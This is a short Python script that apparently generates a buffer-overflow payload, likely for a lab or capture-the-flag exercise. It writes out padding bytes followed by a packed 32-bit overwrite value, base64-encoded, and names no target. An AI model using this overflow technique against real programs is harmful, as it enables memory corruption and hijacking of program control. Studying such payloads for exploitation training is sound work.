
import sys
import struct
import base64

buf = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
buf += struct.pack('<I', 981738188)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
